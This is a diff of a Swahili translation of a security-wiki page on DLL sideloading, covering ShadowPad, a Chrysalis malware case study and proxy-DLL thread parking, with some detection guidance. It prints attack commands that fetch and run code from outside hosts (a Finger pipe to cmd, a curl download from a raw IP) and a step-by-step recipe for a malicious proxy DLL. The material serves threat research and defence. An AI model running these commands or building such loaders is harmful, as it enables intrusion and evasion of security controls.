-* ShadowPad’s decryptor inatarajia TMP blob iwe karibu na loader na iwe writable ili iweze ku-zero file baada ya mapping. Weka directory ikiwa writable hadi payload ipakie; ikiwa tayari iko memory, TMP file inaweza kufutwa kwa usalama kwa ajili ya OPSEC.
+* Kubadilisha jina la signed EXE (huku ukiweka `OriginalFileName` ya awali kwenye PE header) huiruhusu kujifanya Windows binary huku ikihifadhi vendor signature; hivyo, iga tabia ya Ink Dragon ya kuweka binaries zinazoonekana kama `conhost.exe` ambazo kwa kweli ni utilities za AMD/NVIDIA.
+* Kwa kuwa executable hubaki trusted, controls nyingi za allowlisting zinahitaji tu malicious DLL yako iwe kando yake. Lenga kubinafsisha loader DLL; signed parent kwa kawaida inaweza kuendeshwa bila mabadiliko.
+* ShadowPad decryptor inatarajia TMP blob iwe kando ya loader na iwe writable ili iweze kuweka file yote kuwa zero baada ya mapping. Weka directory ikiwa writable hadi payload ipakie; ikiwa kwenye memory, TMP file inaweza kufutwa kwa usalama kwa ajili ya OPSEC.
 
 ### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)
 
-Operators huunganisha DLL sideloading na LOLBAS ili custom artifact pekee iliyo kwenye disk iwe malicious DLL iliyo karibu na trusted EXE:<sup>[[1]](#references)</sup>
+Operators huunganisha DLL sideloading na LOLBAS ili custom artifact pekee iliyo kwenye disk iwe malicious DLL iliyo kando ya trusted EXE:<sup>[[1]](#references)</sup>
 
-- **Remote command loader (Finger):** Hidden PowerShell hu-spawn `cmd.exe /c`, huvuta commands kutoka kwa Finger server, na kuzipeleka kwa `cmd`:
+- **Remote command loader (Finger):** Hidden PowerShell huanzisha `cmd.exe /c`, huchukua commands kutoka kwa Finger server, na kuzipitisha kwa `cmd`:
 
 ```powershell
 powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
 ```
-- `finger user@host` huvuta TCP/79 text; `| cmd` hutekeleza server response, na kuwaruhusu operators kubadilisha second stage server-side.
+- `finger user@host` huchukua text kupitia TCP/79; `| cmd` huendesha response ya server, hivyo operators wanaweza kubadilisha second stage upande wa server.
 
-- **Built-in download/extract:** Download archive yenye benign extension, ifungue, kisha stage sideload target pamoja na DLL chini ya random `%LocalAppData%` folder:
+- **Built-in download/extract:** Pakua archive yenye benign extension, ifungue, na u-stage sideload target pamoja na DLL chini ya random `%LocalAppData%` folder:
 
 ```powershell
 $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
 ```
-- `curl -s -L` huficha progress na kufuata redirects; `tar -xf` hutumia Windows' built-in tar.
+- `curl -s -L` huficha progress na kufuata redirects; `tar -xf` hutumia tar iliyojengwa ndani ya Windows.
 
-- **WMI/CIM launch:** Anzisha EXE kupitia WMI ili telemetry ionyeshe process iliyoundwa na CIM huku ikipakia DLL iliyo-colocate:
+- **WMI/CIM launch:** Anzisha EXE kupitia WMI ili telemetry ionyeshe process iliyoundwa na CIM huku ikipakia DLL iliyo colocated:
 
 ```powershell
 Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
 ```
 - Hufanya kazi na binaries zinazopendelea local DLLs (kwa mfano, `intelbq.exe`, `nearby_share.exe`); payload (kwa mfano, Remcos) huendeshwa chini ya trusted name.
 
-- **Hunting:** Weka alert kwenye `forfiles` wakati `/p`, `/m`, na `/c` zinapoonekana pamoja; hali hii si ya kawaida nje ya admin scripts.
+- **Hunting:** Toa alert kwa `forfiles` wakati `/p`, `/m`, na `/c` zinaonekana pamoja; hali hii si ya kawaida nje ya admin scripts.
 
 
 ## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)
 
-Uvamizi wa hivi karibuni wa Lotus Blossom ulitumia vibaya trusted update chain kupeleka NSIS-packed dropper iliyostage DLL sideload pamoja na payloads zilizo fully in-memory.<sup>[[13]](#references)</sup>
+Lotus Blossom intrusion ya hivi karibuni ilitumia vibaya trusted update chain kupeleka NSIS-packed dropper iliyofanya staging ya DLL sideload pamoja na payloads zilizo kwenye memory kabisa.<sup>[[13]](#references)</sup>
 
-Tradecraft flow
-- `update.exe` (NSIS) huunda `%AppData%\Bluetooth`, huiweka alama **HIDDEN**, huweka Bitdefender Submission Wizard iliyobadilishwa jina kuwa `BluetoothService.exe`, malicious `log.dll`, na encrypted blob `BluetoothService`, kisha huzindua EXE.
-- Host EXE hu-import `log.dll` na kuita `LogInit`/`LogWrite`. `LogInit` hupakia blob kwa mmap; `LogWrite` hu-decrypt kwa kutumia custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material inayotokana na hash ya awali), hu-overwrite buffer kwa plaintext shellcode, hu-free temps, kisha hurukia humo.
+Mtiririko wa tradecraft
+- `update.exe` (NSIS) huunda `%AppData%\Bluetooth`, huiweka kuwa **HIDDEN**, huweka Bitdefender Submission Wizard `BluetoothService.exe` yenye jina lililobadilishwa, malicious `log.dll`, na encrypted blob `BluetoothService`, kisha huanzisha EXE.
+- Host EXE hu-import `log.dll` na kuita `LogInit`/`LogWrite`. `LogInit` hufanya mmap-load ya blob; `LogWrite` hu-decrypt kwa kutumia custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material iliyotokana na hash ya awali), huandika plaintext shellcode juu ya buffer, huachilia temporary data, na kurukia humo.
 - Ili kuepuka IAT, loader hutatua APIs kwa ku-hash export names kwa kutumia **FNV-1a basis 0x811C9DC5 + prime 0x100019**, kisha kutumia Murmur-style avalanche (**0x85EBCA6B**) na kulinganisha dhidi ya salted target hashes.
 
 Main shellcode (Chrysalis)
-- Hu-decrypt PE-like main module kwa kurudia add/XOR/sub kwa key `gQ2JR&9;` katika passes tano, kisha hupakia `Kernel32.dll` → `GetProcAddress` dynamically ili kukamilisha import resolution.
-- Huunda upya DLL name strings wakati wa runtime kupitia per-character bit-rotate/XOR transforms, kisha hupakia `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
-- Hutumia second resolver inayopitia **PEB → InMemoryOrderModuleList**, kuchanganua kila export table katika 4-byte blocks kwa Murmur-style mixing, na hutumia `GetProcAddress` tu ikiwa hash haijapatikana.
+- Hu-decrypt PE-like main module kwa kurudia add/XOR/sub kwa key `gQ2JR&9;` katika passes tano, kisha hu-load `Kernel32.dll` → `GetProcAddress` ili kukamilisha import resolution.
+- Hujenga upya DLL name strings wakati wa runtime kwa kutumia per-character bit-rotate/XOR transforms, kisha hu-load `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
+- Hutumia second resolver inayopita kwenye **PEB → InMemoryOrderModuleList**, huchanganua kila export table katika 4-byte blocks kwa Murmur-style mixing, na hutumia `GetProcAddress` tu ikiwa hash haijapatikana.
 
 Embedded configuration & C2
-- Config iko ndani ya dropped `BluetoothService` file kwenye **offset 0x30808** (size **0x980**) na hu-decryptiwa kwa RC4 kwa key `qwhvb^435h&*7`, ikifichua C2 URL na User-Agent.
-- Beacons huunda dot-delimited host profile, huweka tag `4Q` mwanzoni, kisha hu-encrypt kwa RC4 kwa key `vAuig34%^325hGV` kabla ya `HttpSendRequestA` kupitia HTTPS. Responses hu-decryptiwa kwa RC4 na ku-dispatchiwa na tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
-- Execution mode hudhibitiwa na CLI args: bila args = install persistence (service/Run key) inayoelekeza kwenye `-i`; `-i` hu-relaunch self kwa `-k`; `-k` huruka install na kuendesha payload.
+- Config iko ndani ya file iliyodropped ya `BluetoothService` kwenye **offset 0x30808** (size **0x980**) na hu-decryptiwa kwa RC4 kwa key `qwhvb^435h&*7`, ikifunua C2 URL na User-Agent.
+- Beacons huunda host profile iliyotenganishwa kwa dots, huongeza tag `4Q` mwanzoni, kisha hu-encrypt kwa RC4 kwa key `vAuig34%^325hGV` kabla ya `HttpSendRequestA` kupitia HTTPS. Responses hu-decryptiwa kwa RC4 na kusambazwa na tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
+- Execution mode hudhibitiwa na CLI args: hakuna args = install persistence (service/Run key) inayoelekeza kwenye `-i`; `-i` huanzisha tena self kwa `-k`; `-k` huruka install na kuendesha payload.
 
 Alternate loader observed
-- Uvamizi huo huo uliweka Tiny C Compiler na kutekeleza `svchost.exe -nostdlib -run conf.c` kutoka `C:\ProgramData\USOShared\`, ikiwa na `libtcc.dll` kando yake. C source iliyotolewa na attacker ilikuwa ime-embed shellcode, ikacompile na ku-run in-memory bila kuweka PE kwenye disk. Iga kwa kutumia:
+- Intrusion hiyo hiyo iliweka Tiny C Compiler na kuendesha `svchost.exe -nostdlib -run conf.c` kutoka `C:\ProgramData\USOShared\`, ikiwa na `libtcc.dll` kando yake. C source iliyotolewa na attacker ilikuwa na shellcode iliyo-embedded, ika-compile na kuendeshwa kwenye memory bila kuweka PE kwenye disk. Iga kwa:
 ```cmd
 C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
 ```
-- Hatua hii ya compile-and-run inayotegemea TCC ili-import `Wininet.dll` wakati wa runtime na kuvuta second-stage shellcode kutoka URL iliyowekwa moja kwa moja kwenye code, hivyo kutoa loader inayobadilika ambayo hujifanya kuwa compile run.
+- Hatua hii ya TCC-based compile-and-run ili-import `Wininet.dll` wakati wa runtime na kuvuta shellcode ya hatua ya pili kutoka URL iliyowekwa moja kwa moja, hivyo kutoa loader inayoweza kubadilika na kujifanya kuwa compile run.
 
 ## Signed-host sideloading with export proxying + host thread parking
 
-Baadhi ya minyororo ya DLL sideloading huongeza **stability engineering** ili host halali ibaki hai kwa muda wa kutosha kupakia stages zinazofuata kwa usahihi badala ya ku-crash baada ya malicious DLL kupakiwa.<sup>[[11]](#references)</sup>
+Baadhi ya DLL sideloading chains huongeza **stability engineering** ili host halali iendelee kufanya kazi kwa muda wa kutosha kupakia stages za baadaye kwa usahihi badala ya ku-crash baada ya DLL hasidi kupakiwa.<sup>[[11]](#references)</sup>
 
-Muundo unaoonekana
-- Weka EXE inayoaminika karibu na malicious DLL kwa kutumia jina linalotarajiwa la dependency, kama `version.dll`.
-- Malicious DLL **huproxy kila export inayotarajiwa** kurudi kwenye system DLL halisi (kwa mfano `%SystemRoot%\\System32\\version.dll`) ili import resolution iendelee kufanikiwa na host process iendelee kufanya kazi.
-- Baada ya kupakiwa, malicious DLL **hu-patch host entry point** ili main thread iingie kwenye `Sleep` loop isiyo na mwisho badala ya kutoka au kuendesha code paths zinazoweza kusitisha process.
-- Thread mpya hufanya kazi halisi ya malicious: ku-decrypt jina au path ya DLL ya next-stage (RC4/XOR ni za kawaida), kisha kuizindua kwa `LoadLibrary`.
+Observed pattern
+- Weka EXE inayoaminika pamoja na DLL hasidi, ukitumia jina la dependency linalotarajiwa kama `version.dll`.
+- DLL hasidi **hu-proxy kila export inayotarajiwa** kwenda kwenye system DLL halisi, kwa mfano `%SystemRoot%\\System32\\version.dll`, ili import resolution iendelee kufanikiwa na host process iendelee kufanya kazi.
+- Baada ya kupakiwa, DLL hasidi **hu-patch host entry point** ili main thread iingie kwenye `Sleep` loop isiyo na mwisho badala ya kutoka au kuendesha code paths zitakazosababisha process ikome.
+- Thread mpya hufanya kazi hasidi halisi: kus-decrypt jina au path ya next-stage DLL (RC4/XOR ni za kawaida), kisha kuizindua kwa `LoadLibrary`.
 
-Kwa nini hili ni muhimu
-- DLL proxying ya kawaida hudumisha API compatibility, lakini haihakikishi kuwa host itabaki hai kwa muda wa kutosha kwa stages zinazofuata.
-- Kuweka main thread kwenye `Sleep(INFINITE)` ni njia rahisi ya kuweka signed process ikiwa resident wakati loader ikifanya decryption, staging, au network bootstrap kwenye worker thread.
-- Kuhunting tu `DllMain` inayotia shaka kunaweza kukosa muundo huu ikiwa tabia muhimu hutokea baada ya host entry point ku-patchiwa na secondary thread kuanza.
+Why this matters
+- Normal DLL proxying huhifadhi API compatibility, lakini haihakikishi kuwa host itaendelea kuwa hai kwa muda wa kutosha kwa stages za baadaye.
+- Kuweka main thread kwenye `Sleep(INFINITE)` ni njia rahisi ya kuweka signed process ikiwa resident wakati loader inafanya decryption, staging, au network bootstrap kwenye worker thread.
+- Hunting inayolenga `DllMain` yenye mashaka pekee inaweza kukosa pattern hii ikiwa tabia muhimu hutokea baada ya host entry point ku-patchiwa na secondary thread kuanza.
 
-Workflow ndogo
-1. Nakili signed host EXE na utambue DLL inayoresolve kutoka local directory.
-2. Build proxy DLL inayotoa functions zilezile na kuzi-forward kwenye DLL halali.
+Minimal workflow
+1. Copy signed host EXE na uamue DLL inayoresolve kutoka local directory.
+2. Build proxy DLL inayotangaza functions zilezile na kuzi-forward kwenda kwenye legitimate DLL.
 3. Kwenye `DllMain(DLL_PROCESS_ATTACH)`, create worker thread.
 4. Kutoka kwenye thread hiyo, patch host entry point au main thread start routine ili izunguke kwenye `Sleep`.
-5. Decrypt jina/config ya DLL ya next-stage na uite `LoadLibrary` au u-manual-map payload.
+5. Decrypt jina/config ya next-stage DLL na uite `LoadLibrary` au manual-map payload.
 
 Defensive pivots
-- Signed processes zinazopakia `version.dll` au libraries zinazofanana kutoka application directory yao wenyewe badala ya `System32`.
+- Signed processes zinazopakia `version.dll` au libraries zinazofanana kutoka application directory yao badala ya `System32`.
 - Memory patches kwenye process entry point muda mfupi baada ya image load, hasa jumps/calls zinazoelekezwa kwenye `Sleep`/`SleepEx`.
-- Threads zinazoundwa na proxy DLL na mara moja kuita `LoadLibrary` kwenye DLL ya pili yenye jina lililo-decryptiwa.
-- Full-export proxy DLLs zilizowekwa karibu na vendor executables ndani ya writable staging directories kama `ProgramData`, `%TEMP%`, au archive paths zilizofunguliwa.
+- Threads zinazoundwa na proxy DLL ambazo mara moja huita `LoadLibrary` kwenye DLL ya pili yenye jina lililo-decryptiwa.
+- Full-export proxy DLLs zilizowekwa karibu na vendor executables ndani ya writable staging directories kama `ProgramData`, `%TEMP%`, au unpacked archive paths.
 
 ## References
 
-- [1] [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
+- [1] [Red Canary – Intelligence Insights: Januari 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
 - [2] [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
 - [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
 - [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
@@ -717,5 +717,4 @@ Defensive pivots
 - [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
 - [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
 - [25] [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
-
 {{#include ../../../banners/hacktricks-training.md}}
